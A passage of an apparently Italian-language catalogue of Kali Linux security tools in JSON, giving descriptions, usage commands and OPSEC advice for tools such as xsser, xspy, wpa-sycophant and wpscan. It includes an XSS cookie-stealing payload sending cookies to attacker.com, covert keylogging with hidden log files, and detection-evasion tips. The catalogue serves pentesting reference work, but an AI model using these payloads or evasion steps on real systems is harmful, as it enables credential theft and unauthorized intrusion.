ottimizzare wordlist.</p><pre><code># Combinare e deduplicare wordlist multiple\nwordlistraider -w wordlist1.txt wordlist2.txt -o combined.txt -d\n\n# Filtrare per lunghezza (minimo 8 caratteri)\nwordlistraider -w rockyou.txt -o filtered.txt --min-length 8\n\n# Filtrare per complessita (almeno un numero e un carattere speciale)\nwordlistraider -w input.txt -o complex.txt --contains-digit --contains-special\n\n# Filtrare con regex personalizzata\nwordlistraider -w input.txt -o custom.txt --regex \"^[A-Z].*[0-9]$\"</code></pre><p>Lo strumento mostra statistiche sulle operazioni eseguite, inclusi il numero di righe processate, duplicati rimossi e righe filtrate. L'output puo essere rediretto a file o passato in pipe ad altri strumenti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima di un attacco di password cracking su hash recuperati da un target aziendale, WordlistRaider viene utilizzato per creare una wordlist personalizzata che rispetti la policy di password dell'organizzazione (minimo 8 caratteri, almeno un numero e un carattere speciale), riducendo drasticamente il tempo di cracking. Quando si dispone di wordlist specifiche per settore o lingua (parole italiane, termini del settore target), lo strumento le combina con liste generiche eliminando duplicati per massimizzare la copertura senza ridondanza. WordlistRaider e utile anche per preparare wordlist per directory brute-forcing, filtrando per estensioni e pattern rilevanti per il web server target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> WordlistRaider opera esclusivamente in locale senza generare traffico di rete, quindi non e direttamente rilevabile dal target. Lo strumento lavora sui file nel filesystem dell'attaccante senza interazione con sistemi remoti.</p><p><strong>Impatto operativo:</strong> Il processamento di wordlist molto grandi (decine di GB) puo richiedere risorse significative di CPU, memoria e spazio disco. Le wordlist risultanti possono contenere informazioni sensibili se derivate da breach database.</p><p><strong>Mitigazioni:</strong> Assicurarsi di avere spazio disco sufficiente per le wordlist intermedie e finali. Proteggere le wordlist derivate da breach con cifratura del disco. Eliminare le wordlist temporanee al termine dell'engagement per compliance con le policy di gestione dei dati sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "wpa-sycophant",
    "name": "wpa-sycophant",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wpa-sycophant/",
    "desc": "Relay per attacchi EAP su reti WPA Enterprise catturando credenziali RADIUS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPA Sycophant e uno strumento specializzato per attacchi relay su reti WPA Enterprise che utilizzano autenticazione EAP (Extensible Authentication Protocol). Lo strumento agisce come supplicant malevolo che intercetta e rilancia le credenziali EAP tra un client legittimo e il server RADIUS, sfruttando la mancanza di mutua autenticazione in alcune configurazioni EAP. WPA Sycophant e progettato per funzionare in combinazione con strumenti come hostapd-mana o eaphammer per creare un rogue AP che cattura le risposte EAP dei client e le rilancia verso la rete legittima. Questo tipo di attacco e particolarmente efficace contro reti che utilizzano PEAP o EAP-TTLS senza validazione del certificato lato client. Lo strumento opera come componente di una catena di attacco relay per reti wireless enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Relay EAP automatizzato:</strong> WPA Sycophant gestisce automaticamente il protocollo di handshake EAP, intercettando le challenge dal server RADIUS tramite il rogue AP e rilanciandole al client vittima. Il relay avviene in tempo reale senza necessita di craccare le credenziali, poiche l'autenticazione viene completata utilizzando le risposte legittime del client. Supporta i protocolli EAP-PEAP e EAP-TTLS comunemente utilizzati nelle reti enterprise.</p><p><strong>Integrazione con rogue AP:</strong> Lo strumento e progettato per integrarsi con framework di rogue AP come hostapd-mana e eaphammer, ricevendo le credenziali EAP intercettate e utilizzandole per autenticarsi sulla rete legittima. La comunicazione tra i componenti avviene tramite socket o pipe per garantire il relay in tempo reale. L'architettura modulare permette di sostituire i componenti con implementazioni alternative.</p><p><strong>Cattura credenziali RADIUS:</strong> Durante il relay, WPA Sycophant registra le challenge-response EAP che possono essere successivamente utilizzate per tentativi di cracking offline delle credenziali. I dati catturati includono hash NTLM e challenge MSCHAPv2 che possono essere processati con hashcat o john. Questo fornisce un vettore secondario nel caso il relay non sia sufficiente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WPA Sycophant viene utilizzato in combinazione con un rogue AP per eseguire attacchi relay su reti WPA Enterprise.</p><pre><code># Configurazione del rogue AP con hostapd-mana\n# hostapd-mana /etc/hostapd-mana/mana.conf\n\n# Avvio di WPA Sycophant come supplicant relay\nwpa_sycophant -c wpa_sycophant.conf -i wlan1\n\n# Configurazione esempio (wpa_sycophant.conf)\n# network={\n#   ssid=\"TargetEnterprise\"\n#   key_mgmt=WPA-EAP\n#   eap=PEAP\n#   identity=\"relay\"\n#   phase2=\"auth=MSCHAPV2\"\n# }\n\n# Monitoraggio del relay in tempo reale\ntail -f /var/log/wpa_sycophant.log</code></pre><p>L'attacco richiede due interfacce wireless: una per il rogue AP e una per la connessione alla rete legittima tramite il relay. La configurazione deve corrispondere ai parametri della rete target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante assessment di reti wireless enterprise, WPA Sycophant viene utilizzato per verificare se la rete e vulnerabile ad attacchi relay EAP, dimostrando che un attaccante puo ottenere accesso alla rete senza conoscere le credenziali sfruttando client configurati senza validazione del certificato RADIUS. In scenari di red teaming, l'attacco relay permette di ottenere accesso alla rete enterprise interna senza necessita di craccare password, bypassando anche policy di complessita e MFA basati su password. Lo strumento e utilizzato anche per valutare l'efficacia delle configurazioni di sicurezza EAP e le policy di distribuzione dei certificati RADIUS sui dispositivi aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il rogue AP e rilevabile da sistemi WIDS che monitorano la comparsa di access point non autorizzati con SSID aziendali. Le autenticazioni relay possono generare anomalie nei log del server RADIUS, come autenticazioni simultanee dallo stesso utente o da MAC address sconosciuti.</p><p><strong>Impatto operativo:</strong> L'attacco richiede la presenza fisica nelle vicinanze della rete target e dei client. La deauthentication necessaria per forzare la riconnessione dei client causa interruzioni di servizio visibili. Il relay deve avvenire in tempo reale, rendendo l'attacco sensibile a latenza e interferenze.</p><p><strong>Mitigazioni:</strong> Limitare la deauthentication a singoli client piuttosto che broadcast. Operare in orari di alta attivita per mascherare le interruzioni. Utilizzare antenne direzionali per limitare il raggio d'azione del rogue AP e ridurre la visibilita.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wpscan",
    "name": "wpscan",
    "version": "3.8.28",
    "icon": "../app/icons/wpscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wpscan/",
    "desc": "Scanner WordPress: enumera utenti, plugin, temi vulnerabili con database CVE.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WPScan e lo scanner di sicurezza piu completo e affidabile per WordPress, il CMS piu utilizzato al mondo. Lo strumento enumera utenti, plugin, temi e configurazioni del sito WordPress target, confrontando le versioni identificate con un database di vulnerabilita costantemente aggiornato. WPScan e scritto in Ruby e utilizza il WPScan Vulnerability Database che contiene migliaia di CVE relative a WordPress core, plugin e temi. Lo scanner supporta tecniche di enumerazione sia passive (basate su pagine pubbliche) che aggressive (brute-forcing di endpoint noti). WPScan e uno strumento essenziale per qualsiasi penetration tester che affronta target WordPress, grazie alla sua capacita di identificare rapidamente vulnerabilita sfruttabili nell'ecosistema WordPress.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione plugin e temi:</strong> WPScan identifica plugin e temi installati tramite diverse tecniche tra cui analisi del codice sorgente HTML, brute-forcing di percorsi noti e fingerprinting di file statici. Per ogni componente identificato, lo scanner verifica la versione e la confronta con il database di vulnerabilita. I plugin rappresentano il vettore di attacco piu comune su WordPress con migliaia di vulnerabilita documentate.</p><p><strong>Enumerazione utenti:</strong> Lo scanner enumera gli utenti WordPress tramite diverse tecniche tra cui API REST, author archives e login brute-force. Per ogni utente identificato, WPScan puo tentare attacchi di password brute-force con wordlist personalizzate. Supporta la detection di username anche quando le impostazioni di sicurezza tentano di nasconderli.</p><p><strong>Database vulnerabilita integrato:</strong> WPScan integra un database di vulnerabilita dedicato a WordPress con aggiornamenti quotidiani che copre il core, plugin e temi. Ogni vulnerabilita include CVE, descrizione, versioni affette e riferimenti a exploit pubblici. L'accesso al database completo richiede un API token gratuito che abilita le ricerche di vulnerabilita durante la scansione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WPScan si utilizza da linea di comando specificando l'URL del sito WordPress target.</p><pre><code># Scansione base\nwpscan --url http://target.com\n\n# Enumerazione aggressiva di plugin vulnerabili\nwpscan --url http://target.com -e vp --plugins-detection aggressive\n\n# Enumerazione utenti con brute-force password\nwpscan --url http://target.com -e u --passwords /usr/share/wordlists/rockyou.txt\n\n# Scansione completa con API token\nwpscan --url http://target.com -e vp,vt,u --api-token YOUR_TOKEN\n\n# Scansione tramite proxy\nwpscan --url http://target.com --proxy http://127.0.0.1:8080</code></pre><p>L'API token gratuito si ottiene registrandosi su wpscan.com e permette un numero limitato di query giornaliere al database di vulnerabilita. Senza token, la scansione funziona ma non mostra le vulnerabilita note.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante penetration test su siti WordPress, WPScan identifica rapidamente plugin obsoleti con vulnerabilita note come SQL injection, file upload arbitrario o remote code execution, fornendo exploit di riferimento per la fase di exploitation. In programmi di bug bounty, lo scanner viene utilizzato come primo passo per l'assessment di target WordPress, enumerando la superficie di attacco completa inclusi plugin premium e temi personalizzati. WPScan e utilizzato anche dal blue team per audit periodici di sicurezza su installazioni WordPress aziendali, verificando che tutti i componenti siano aggiornati e non presentino vulnerabilita note.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo user-agent di WPScan e identificato da tutti i principali plugin di sicurezza WordPress come Wordfence, Sucuri e iThemes Security. La modalita di enumerazione aggressiva genera centinaia di richieste a percorsi tipici di plugin che attivano sistemi di protezione e rate limiting.</p><p><strong>Impatto operativo:</strong> Le scansioni aggressive possono essere bloccate da WAF e plugin di sicurezza, risultando in ban dell'IP. Il brute-force delle password genera tentativi di login che possono bloccare account utente se configurato il lockout.</p><p><strong>Mitigazioni:</strong> Utilizzare l'opzione --random-user-agent per variare lo user-agent. Rallentare le richieste con --throttle per evitare rate limiting. Utilizzare la modalita passive per l'enumerazione iniziale e passare ad aggressive solo per verifiche mirate. Utilizzare proxy per distribuire il traffico.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "xplico",
    "name": "xplico",
    "version": "1.2.2",
    "icon": "../app/icons/xplico-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xplico/",
    "desc": "Estrae dati da catture pcap: email, HTTP, VoIP, file per network forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Xplico e uno strumento di network forensics progettato per estrarre e ricostruire dati applicativi da catture di traffico di rete in formato pcap. Lo strumento e in grado di ricostruire email (SMTP, POP, IMAP), pagine web (HTTP), sessioni VoIP (SIP, RTP), file trasferiti (FTP, TFTP), messaggi di chat e molti altri protocolli applicativi. Xplico opera come un Internet Traffic Decoder che analizza i pacchetti catturati e li riassembla nei contenuti originali fruibili dall'analista. L'interfaccia web permette di navigare i dati estratti in modo organizzato per protocollo, sessione e timeline. Lo strumento e ampiamente utilizzato in contesti di digital forensics e incident response per analizzare grandi volumi di traffico di rete e ricostruire le attivita degli utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Ricostruzione multi-protocollo:</strong> Xplico supporta la decodifica e ricostruzione di decine di protocolli applicativi tra cui HTTP, SMTP, POP3, IMAP, SIP, RTP, FTP, TFTP, DNS e molti altri. Per ogni protocollo, i dati vengono estratti e presentati nel formato originale: email complete con allegati, pagine web navigabili, file trasferiti integri. La ricostruzione avviene automaticamente senza intervento manuale dell'analista.</p><p><strong>Interfaccia web investigativa:</strong> Xplico offre un'interfaccia web che organizza i dati estratti per caso investigativo, sessione e protocollo. L'interfaccia permette di navigare email ricostruite, visualizzare pagine web catturate, ascoltare chiamate VoIP e scaricare file trasferiti. Il sistema di gestione casi supporta analisi multiple contemporanee con separazione dei dati e controllo degli accessi.</p><p><strong>Analisi VoIP avanzata:</strong> Lo strumento ricostruisce chiamate VoIP dai protocolli SIP e RTP, producendo file audio ascoltabili delle conversazioni catturate. Supporta diversi codec audio tra cui G.711, G.729 e GSM. La ricostruzione delle chiamate include metadata come numeri chiamanti, durata e timestamp per la correlazione temporale degli eventi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Xplico si utilizza tramite interfaccia web dopo aver importato file di cattura pcap o tramite cattura live.</p><pre><code># Avvio del servizio Xplico\nsudo service xplico start\n\n# Accesso all'interfaccia web\n# Navigare a http://localhost:9876\n# Credenziali default: xplico/xplico\n\n# Utilizzo da linea di comando per analisi rapida\nxplico -m pcap -f cattura.pcap\n\n# Cattura live su interfaccia\nxplico -m rltm -i eth0\n\n# Decodifica specifica per HTTP\nxplico -m pcap -f cattura.pcap -d http</code></pre><p>Dopo l'importazione del file pcap, Xplico processa automaticamente il traffico e presenta i risultati nell'interfaccia web organizzati per protocollo. L'analisi di file pcap di grandi dimensioni puo richiedere tempo e risorse significative.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In indagini di incident response, Xplico viene utilizzato per analizzare catture di traffico di rete e ricostruire le attivita di un attaccante, incluse email inviate, file scaricati, pagine web visitate e comunicazioni VoIP effettuate durante la compromissione. In contesti forensi legali, lo strumento permette di estrarre evidenze digitali da catture di rete in modo sistematico, producendo contenuti fruibili (email, file, pagine web) utilizzabili come prove documentali. Xplico e utilizzato anche in penetration test per analizzare il traffico intercettato tramite MITM, estraendo automaticamente credenziali, cookie di sessione e dati sensibili trasmessi in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Xplico opera offline su file pcap gia catturati, quindi non genera traffico di rete aggiuntivo e non e rilevabile dal target. La cattura del traffico originale (prerequisito) e l'operazione che puo essere rilevata.</p><p><strong>Impatto operativo:</strong> L'analisi di catture di grandi dimensioni richiede risorse significative di CPU, memoria e spazio disco per la ricostruzione dei contenuti. I dati estratti contengono informazioni altamente sensibili che devono essere protetti adeguatamente.</p><p><strong>Mitigazioni:</strong> Eseguire Xplico su workstation dedicate con storage cifrato per proteggere i dati estratti. Limitare l'accesso all'interfaccia web con autenticazione forte. Eliminare i dati estratti al termine dell'analisi secondo le policy di retention dell'engagement. Documentare la catena di custodia dei file pcap e dei dati estratti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "xspy",
    "name": "xspy",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xspy/",
    "desc": "Keylogger per X Window System che cattura input da tutte le applicazioni GUI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>xspy e un keylogger minimale per sistemi Unix/Linux che utilizzano il sistema grafico X Window System (X11). Lo strumento cattura tutti gli eventi di tastiera (KeyPress) inviati alle applicazioni grafiche attraverso il server X, registrando i tasti premuti dall'utente in tempo reale. xspy sfrutta le funzionalita native del protocollo X11 per intercettare gli input senza necessita di modificare le applicazioni monitorate o iniettare codice. Lo strumento e estremamente leggero e non richiede privilegi di root se l'utente ha accesso al display X11 target. Nel contesto della post-exploitation, xspy rappresenta un metodo rapido per catturare credenziali e informazioni sensibili digitate dall'utente in qualsiasi applicazione grafica inclusi browser, terminali e client email.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Cattura eventi X11:</strong> xspy utilizza le API X11 per registrarsi come listener degli eventi KeyPress su tutte le finestre del display target. La cattura avviene a livello di protocollo X senza necessita di hook a livello di kernel o librerie condivise. Lo strumento intercetta i tasti prima che vengano processati dalle applicazioni, garantendo la cattura completa dell'input.</p><p><strong>Leggerezza e portabilita:</strong> Il binario di xspy e estremamente compatto (pochi KB) e non ha dipendenze oltre alle librerie X11 standard presenti su qualsiasi sistema con interfaccia grafica. La sua dimensione ridotta facilita il trasferimento sul target attraverso canali con banda limitata. L'esecuzione non genera attivita di disco o rete visibile, rendendo lo strumento difficile da rilevare.</p><p><strong>Output in tempo reale:</strong> xspy visualizza i tasti premuti in tempo reale sullo stdout, con la possibilita di redirigere l'output su file per registrazione prolungata. Lo strumento converte i keycode X11 nei caratteri corrispondenti tenendo conto del layout di tastiera. L'output include tasti speciali come Enter, Backspace e tasti modificatori per ricostruire il testo completo digitato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>xspy viene eseguito sul sistema target con accesso al display X11 dell'utente da monitorare.</p><pre><code># Esecuzione base sul display locale\nxspy\n\n# Cattura su display specifico\nxspy -display :0\n\n# Registrazione su file con timestamp\nxspy > /tmp/.cache_xspy.log 2>&1 &\n\n# Monitoraggio di un display remoto (se X11 forwarding attivo)\nexport DISPLAY=:10.0\nxspy</code></pre><p>xspy richiede accesso al display X11 target, che e automaticamente disponibile se si opera come lo stesso utente o se l'autenticazione X11 (xhost, xauth) e configurata in modo permissivo. Lo strumento funziona solo su sistemi con X11 e non su Wayland.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Dopo aver ottenuto accesso a un sistema Linux con interfaccia grafica, xspy viene utilizzato per catturare credenziali digitate dall'utente in applicazioni come browser (login web), terminali (comandi sudo con password) e client email, senza dover compromettere ogni singola applicazione. In scenari di post-exploitation dove l'attaccante ha accesso SSH con X11 forwarding, xspy puo catturare l'input di sessioni grafiche remote dell'utente target. Lo strumento e utile anche per dimostrare durante assessment i rischi di configurazioni X11 permissive dove xhost + consente a qualsiasi utente locale di accedere al display.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> xspy puo essere rilevato tramite listing dei processi (ps, top) se non rinominato. Sistemi di monitoraggio che controllano le connessioni al server X11 possono identificare client sospetti. Su sistemi con Wayland invece di X11, lo strumento non funziona e potrebbe generare errori visibili.</p><p><strong>Impatto operativo:</strong> La cattura e limitata ai sistemi con X11 attivo e non funziona su server senza interfaccia grafica o su sistemi che utilizzano Wayland come display server. L'accesso al display richiede che l'autenticazione X11 sia permissiva o che si operi come lo stesso utente.</p><p><strong>Mitigazioni:</strong> Rinominare il binario per evitare rilevamento basato sul nome del processo. Eseguire in background con output su file nascosto. Eliminare il binario e i log dopo il recupero delle informazioni. Verificare preventivamente che il target utilizzi X11 e non Wayland.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "xsrfprobe",
    "name": "xsrfprobe",
    "version": "2.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xsrfprobe/",
    "desc": "Scanner e exploiter CSRF automatico con detection di token e bypass tecniche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>XSRFProbe e uno strumento automatizzato per il rilevamento e lo sfruttamento di vulnerabilita Cross-Site Request Forgery (CSRF) nelle applicazioni web. Lo scanner analizza automaticamente i form HTML, identifica la presenza o assenza di token anti-CSRF e tenta diverse tecniche di bypass per verificare la reale exploitability della vulnerabilita. XSRFProbe e scritto in Python e supporta l'analisi di applicazioni complesse con autenticazione, cookie di sessione e header personalizzati. Lo strumento genera automaticamente proof-of-concept HTML per le vulnerabilita confermate, facilitando la documentazione e la riproduzione durante il reporting. XSRFProbe rappresenta uno degli strumenti piu completi per l'assessment specifico di vulnerabilita CSRF, una classe di attacchi spesso sottovalutata ma con impatto potenzialmente elevato.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Detection automatica CSRF:</strong> XSRFProbe analizza tutti i form presenti nelle pagine target identificando quelli privi di token anti-CSRF o con token implementati in modo inadeguato. Lo scanner verifica se i token sono validati lato server, se sono legati alla sessione utente e se vengono rigenerati ad ogni richiesta. L'analisi copre sia form HTML standard che richieste AJAX identificate nel codice JavaScript.</p><p><strong>Tecniche di bypass token:</strong> Lo strumento implementa diverse tecniche di bypass per token anti-CSRF tra cui token deletion, token reuse, token fixation e parameter pollution. Verifica se il server accetta richieste senza il token, con token vuoti, con token di sessioni diverse o con token manipolati. Queste verifiche determinano se la protezione CSRF e effettivamente implementata in modo robusto.</p><p><strong>Generazione PoC automatica:</strong> Per ogni vulnerabilita CSRF confermata, XSRFProbe genera automaticamente un file HTML di proof-of-concept che riproduce l'attacco. Il PoC include il form malevolo con tutti i parametri necessari e puo essere utilizzato per dimostrare la vulnerabilita durante la fase di reporting. I PoC generati sono personalizzabili e includono JavaScript per l'auto-submit.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>XSRFProbe si utilizza da linea di comando specificando l'URL target e le opzioni di autenticazione.</p><pre><code># Scansione base di un'applicazione web\nxsrfprobe -u http://target.com/\n\n# Scansione con autenticazione via cookie\nxsrfprobe -u http://target.com/dashboard -c \"session=abc123; user=admin\"\n\n# Scansione con output dettagliato e PoC\nxsrfprobe -u http://target.com/ --output /tmp/csrf_report/\n\n# Scansione con crawling delle pagine\nxsrfprobe -u http://target.com/ --crawl\n\n# Esclusione di URL specifici\nxsrfprobe -u http://target.com/ --exclude logout,delete</code></pre><p>Lo strumento esegue il crawling delle pagine raggiungibili dal punto di ingresso specificato, analizzando ogni form trovato. I risultati vengono presentati in console con dettagli sulla vulnerabilita e il percorso del PoC generato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante penetration test di applicazioni web, XSRFProbe viene utilizzato per verificare sistematicamente che tutti i form critici (cambio password, modifica profilo, operazioni finanziarie) siano protetti da token anti-CSRF validi e correttamente implementati. In programmi di bug bounty, lo strumento accelera l'identificazione di endpoint vulnerabili a CSRF, generando automaticamente PoC HTML pronti per la submission del report. XSRFProbe e utile anche per il blue team durante security review del codice, verificando che le protezioni CSRF siano implementate in modo uniforme su tutta l'applicazione e che non esistano endpoint dimenticati o con bypass possibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste di XSRFProbe sono simili a normali interazioni con form web e sono quindi difficili da distinguere dal traffico legittimo. Tuttavia, il crawling automatico e i tentativi multipli con token manipolati possono generare pattern anomali rilevabili da WAF.</p><p><strong>Impatto operativo:</strong> L'invio di form senza token o con token manipolati puo attivare protezioni applicative che bloccano la sessione o richiedono re-autenticazione. Su applicazioni con operazioni irreversibili, l'auto-submit dei form potrebbe causare modifiche non desiderate ai dati.</p><p><strong>Mitigazioni:</strong> Utilizzare un account di test dedicato per evitare modifiche a dati di produzione. Escludere endpoint con operazioni distruttive (delete, transfer) dalla scansione automatica. Coordinare con il team del target per identificare operazioni sensibili da escludere. Monitorare le risposte per verificare che le operazioni non causino effetti collaterali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "CSRF"
    ],
    "notes": null
  },
  {
    "id": "xsser",
    "name": "xsser",
    "version": "1.8.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/xsser/",
    "desc": "Framework XSS automatico per detection, bypass WAF e generazione payload avanzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>XSSer</strong> è un framework automatizzato completo per detection e exploitation di vulnerabilità Cross-Site Scripting. Supporta test approfonditi di XSS reflected, stored e DOM-based con un arsenale di tecniche avanzate per bypass WAF, encoding multipli, obfuscation e generazione di payload personalizzati. Include funzionalità di exploitation complete per dimostrare l'impatto reale delle vulnerabilità trovate durante penetration test.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive XSS Detection:</strong> identifica automaticamente reflected XSS, stored XSS e DOM-based XSS attraverso injection intelligente, analisi delle risposte e tracking del payload attraverso l'applicazione con supporto per scenari complessi multi-step.</p><p><strong>Advanced WAF Bypass:</strong> libreria estesa di tecniche di evasion inclusi encoding multipli (URL, HTML, Base64, Unicode), obfuscation JavaScript, splitting di payload, case variation e bypass specifici per WAF comuni come ModSecurity, Cloudflare e AWS WAF.</p><p><strong>Custom Payload Generator:</strong> genera payload personalizzati per scenari specifici con template modificabili, supporto per polyglot payload, context-aware injection e adattamento automatico al contesto HTML/JavaScript/attribute.</p><p><strong>Full Exploitation Capabilities:</strong> funzionalità complete di exploitation inclusi cookie stealing con exfiltration server, keylogging JavaScript, screenshot capture, phishing overlay, BeEF integration e reverse shell via XSS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test singolo URL con parametro vulnerabile\nxsser -u \"https://target.com/page?param=XSS\"\n\n# Automatic mode con tutti i bypass\nxsser -u \"https://target.com/page?param=XSS\" --auto\n\n# Cookie stealing con server di raccolta\nxsser -u \"https://target.com/page?param=XSS\" --Fp \"&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;\"\n\n# Crawl dell'applicazione e test XSS\nxsser --crawl \"https://target.com\" -c 100\n\n# Con proxy Burp/ZAP per analisi\nxsser -u \"https://target.com/page?param=XSS\" --proxy http://127.0.0.1:8080\n\n# DOM XSS testing\nxsser -u \"https://target.com/page#XSS\" --Dom\n\n# POST request testing\nxsser -u \"https://target.com/form\" -p \"username=XSS&amp;password=test\"\n\n# Con custom headers e cookies\nxsser -u \"https://target.com/page?param=XSS\" --cookie \"session=abc123\" --headers \"X-Custom: value\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Pentesting</strong>, identificare sistematicamente vulnerabilità XSS in applicazioni web durante assessment di sicurezza, testando input validation e output encoding.</p><p>Per <strong>WAF Effectiveness Testing</strong>, validare l'efficacia di Web Application Firewall contro payload XSS avanzati, identificando gap nelle regole di protezione.</p><p>Per <strong>Security Research</strong>, sviluppare e testare nuovi payload XSS per scenari di exploitation specifici, contribuendo alla ricerca sulla sicurezza web.</p><p>Per <strong>Bug Bounty Hunting</strong>, automatizzare la ricerca di XSS su larga scala durante programmi bug bounty con reporting dettagliato delle vulnerabilità trovate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload XSS nei log applicativi e WAF sono facilmente identificabili e possono generare alert immediati. WAF moderni con machine learning rilevano pattern di test anche con encoding. L'exploitation reale (cookie stealing, keylogging) lascia tracce nei log browser, network e server. Usare solo in ambiente autorizzato con permesso scritto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "yara",
    "name": "yara",
    "version": "4.5.4",
    "icon": "../app/icons/yara-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/yara/",
    "desc": "Pattern matching per malware analysis: identifica sample con regole personalizzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>YARA</strong> è lo standard de facto per pattern matching nella malware analysis e threat hunting, utilizzato da ricercatori di sicurezza, SOC analyst e incident responder in tutto il mondo. Permette di creare regole personalizzate altamente espressive per identificare e classificare malware basandosi su pattern testuali e binari, condizioni logiche complesse, metadata e caratteristiche strutturali dei file. È il cuore di molti sistemi di detection enterprise e piattaforme di threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Advanced Pattern Matching:</strong> match potente su stringhe ASCII/Unicode, pattern esadecimali con wildcard e jump, espressioni regolari, e condizioni booleane complesse che permettono di esprimere signature sofisticate per malware polimorfico e varianti.</p><p><strong>Expressive Rule Language:</strong> linguaggio dedicato per definire signature malware con supporto per variabili, condizioni logiche (and, or, not), operatori di conteggio, range, offset e lunghezza per creare detection precise con bassi falsi positivi.</p><p><strong>Extensible Module System:</strong> moduli integrati per analisi di PE (import, export, section, resources), ELF, Mach-O, hash (MD5, SHA256, imphash), math, cuckoo sandbox e possibilità di creare moduli custom in C.</p><p><strong>Enterprise Scalability:</strong> engine ottimizzato per scansione ad alta velocità di grandi dataset di file, con supporto per multi-threading, scanning di processi in memoria e integrazione con sandbox e SIEM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singolo file con regola\nyara rule.yar suspicious_file\n\n# Scan directory ricorsivo con multiple regole\nyara -r rules_directory/ /path/to/samples/\n\n# Output con metadata delle regole\nyara -m rule.yar file\n\n# Scan con tag filtering\nyara -t ransomware rules/ samples/\n\n# Output solo nomi file che matchano\nyara -l rule.yar directory/\n\n# Scan processo in memoria (Linux)\nyara rule.yar -p &lt;pid&gt;\n\n# Con timeout per regole complesse\nyara -a 60 complex_rule.yar large_file\n\n# Compilare regole per performance\nyarac rules/ compiled.yarc\nyara -C compiled.yarc samples/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Detection &amp; Classification</strong>, identificare e categorizzare sample malware noti e varianti tramite signature custom, supportando triage automatizzato in ambienti di analisi.</p><p>Per <strong>Threat Hunting Proattivo</strong>, cercare indicatori di compromissione su filesystem, memoria e network capture usando regole basate su threat intelligence per identificare intrusioni attive.</p><p>Per <strong>Incident Response</strong>, classificare rapidamente malware trovato durante investigazioni forensi, correlando sample con famiglie note e campagne APT documentate.</p><p>Per <strong>Threat Intelligence Sharing</strong>, 